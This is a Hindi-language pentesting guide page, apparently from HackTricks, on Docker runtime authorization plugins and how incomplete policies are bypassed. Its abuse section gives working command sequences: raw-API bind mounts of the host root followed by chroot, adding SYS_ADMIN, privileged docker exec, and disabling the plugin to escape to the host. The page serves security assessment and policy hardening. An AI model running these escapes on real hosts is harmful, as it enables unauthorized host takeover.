# Runtime Authorization Plugins

## Overview

Runtime authorization plugins एक अतिरिक्त policy layer हैं, जो यह तय करती है कि कोई caller किसी दिए गए daemon action को कर सकता है या नहीं। Docker इसका classic example है। Default रूप से, जो भी व्यक्ति Docker daemon से बात कर सकता है, उसका इस पर प्रभावी रूप से व्यापक control होता है। Authorization plugins authenticated user और requested API operation की जांच करके, फिर policy के अनुसार request को allow या deny करके इस model को सीमित करने का प्रयास करती हैं।

यह topic अपने अलग page का हकदार है, क्योंकि जब attacker के पास पहले से Docker API या `docker` group के किसी user का access हो, तो यह exploitation model बदल देता है। ऐसे environments में सवाल केवल "क्या मैं daemon तक पहुंच सकता हूं?" नहीं रह जाता, बल्कि यह भी होता है: "क्या daemon को authorization layer से fenced किया गया है, और यदि हां, तो क्या उस layer को unhandled endpoints, कमजोर JSON parsing, या plugin-management permissions के जरिए bypass किया जा सकता है?"

## Operation

जब कोई request Docker daemon तक पहुंचती है, तो authorization subsystem request context को एक या अधिक installed plugins को भेज सकता है। Plugin authenticated user identity, request details, selected headers और request या response body के कुछ हिस्सों को देखता है, जब content type उपयुक्त हो। Multiple plugins को chain किया जा सकता है, और access तभी दिया जाता है जब सभी plugins request को allow करें।

यह model मजबूत लगता है, लेकिन इसकी safety पूरी तरह इस बात पर निर्भर करती है कि policy author ने API को कितनी पूर्णता से समझा है। ऐसा plugin जो `docker run --privileged` को block करता है लेकिन `docker exec` को ignore करता है, top-level `Binds` जैसी alternate JSON keys को miss करता है, या plugin administration को allow करता है, restriction का झूठा एहसास पैदा कर सकता है, जबकि direct privilege-escalation paths अभी भी खुले रहते हैं।

## Common Plugin Targets

Policy review के लिए महत्वपूर्ण areas हैं:

- container creation endpoints
- `HostConfig` fields जैसे `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` और namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- कोई भी endpoint जो intended policy model के बाहर runtime actions को indirectly trigger कर सकता है

Historically, Twistlock का `authz` plugin और `authobot` जैसे simple educational plugins ने इस model का अध्ययन आसान बनाया, क्योंकि उनकी policy files और code paths दिखाती थीं कि endpoint-to-action mapping वास्तव में कैसे implement की गई थी। Assessment work के लिए महत्वपूर्ण lesson यह है कि policy author को केवल सबसे visible CLI commands के बजाय पूरी API surface को समझना आवश्यक है।

## Abuse

पहला goal यह जानना है कि वास्तव में क्या blocked है। यदि daemon किसी action को deny करता है, तो error अक्सर plugin name leak कर देती है, जिससे उपयोग में मौजूद control की पहचान करने में मदद मिलती है:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
यदि आपको व्यापक endpoint profiling की आवश्यकता है, तो `docker_auth_profiler` जैसे tools उपयोगी हैं, क्योंकि वे plugin द्वारा वास्तव में अनुमत API routes और JSON structures की जाँच करने के दोहराव वाले कार्य को स्वचालित करते हैं।

यदि environment custom plugin का उपयोग करता है और आप API के साथ interact कर सकते हैं, तो enumerate करें कि कौन-से object fields वास्तव में filtered हैं:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
ये जाँचें महत्वपूर्ण हैं क्योंकि कई authorization failures concept-specific के बजाय field-specific होते हैं। कोई plugin किसी CLI pattern को अस्वीकार कर सकता है, लेकिन उसके समकक्ष API structure को पूरी तरह block नहीं कर सकता।

### पूर्ण उदाहरण: `docker exec` कंटेनर बनने के बाद विशेषाधिकार जोड़ता है

ऐसी policy जिसमें privileged container बनाने पर रोक हो, लेकिन unconfined container बनाने और उसके बाद `docker exec` की अनुमति हो, फिर भी bypass की जा सकती है:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
यदि daemon दूसरा चरण स्वीकार कर लेता है, तो user ने container के अंदर एक privileged interactive process वापस प्राप्त कर लिया है, जिसे policy author ने constrained माना था।

### Full Example: Bind Mount Through Raw API

कुछ broken policies केवल एक JSON shape का निरीक्षण करती हैं। यदि root filesystem bind mount को लगातार block नहीं किया जाता है, तो host को अभी भी mount किया जा सकता है:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
वही विचार `HostConfig` के अंतर्गत भी दिखाई दे सकता है:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
प्रभाव पूर्ण host filesystem escape है। दिलचस्प बात यह है कि bypass kernel bug के बजाय अधूरी policy coverage से होता है।

### पूरा उदाहरण: Unchecked Capability Attribute

यदि policy किसी capability-related attribute को filter करना भूल जाती है, तो attacker ऐसा container बना सकता है जो एक खतरनाक capability फिर से प्राप्त कर लेता है:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
एक बार `CAP_SYS_ADMIN` या इसी तरह की शक्तिशाली capability मौजूद हो जाने पर, [capabilities.md](protections/capabilities.md) और [privileged-containers.md](privileged-containers.md) में वर्णित कई breakout techniques तक पहुंच संभव हो जाती है।

### पूर्ण उदाहरण: Plugin को अक्षम करना

यदि plugin-management operations की अनुमति हो, तो सबसे साफ bypass पूरे control को बंद कर देना हो सकता है:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
यह control-plane स्तर पर policy की विफलता है। Authorization layer मौजूद है, लेकिन जिस user को प्रतिबंधित करना था, उसके पास अभी भी इसे disable करने की permission है।

## जाँच

इन commands का उद्देश्य यह पहचानना है कि कोई policy layer मौजूद है या नहीं, और क्या वह complete प्रतीत होती है या केवल superficial है।
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
यहाँ क्या interesting है:

- ऐसे denial messages जिनमें plugin name शामिल हो, authorization layer की पुष्टि करते हैं और अक्सर exact implementation भी reveal करते हैं।
- Attacker को दिखाई देने वाली plugin list यह पता लगाने के लिए पर्याप्त हो सकती है कि disable या reconfigure operations संभव हैं या नहीं।
- ऐसी policy जो केवल obvious CLI actions को block करती है लेकिन raw API requests को नहीं, उसे तब तक bypassable माना जाना चाहिए जब तक इसके विपरीत प्रमाण न हो।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | By default enabled नहीं | यदि authorization plugin configured न हो, तो Daemon access effectively all-or-nothing होता है | incomplete plugin policy, allowlists के बजाय blacklists, plugin management की अनुमति, field-level blind spots |
| Podman | Common direct equivalent नहीं | Podman आमतौर पर Docker-style authz plugins के बजाय Unix permissions, rootless execution और API exposure decisions पर अधिक निर्भर करता है | rootful Podman API को broadly expose करना, weak socket permissions |
| containerd / CRI-O | अलग control model | ये runtimes आमतौर पर Docker authz plugins के बजाय socket permissions, node trust boundaries और higher-layer orchestrator controls पर निर्भर करते हैं | workloads में socket mount करना, weak node-local trust assumptions |
| Kubernetes | API-server और kubelet layers पर authn/authz का उपयोग करता है, Docker authz plugins का नहीं | Cluster RBAC और admission controls मुख्य policy layer हैं | overbroad RBAC, weak admission policy, kubelet या runtime APIs को directly expose करना |

{{#include ../../../banners/hacktricks-training.md}}
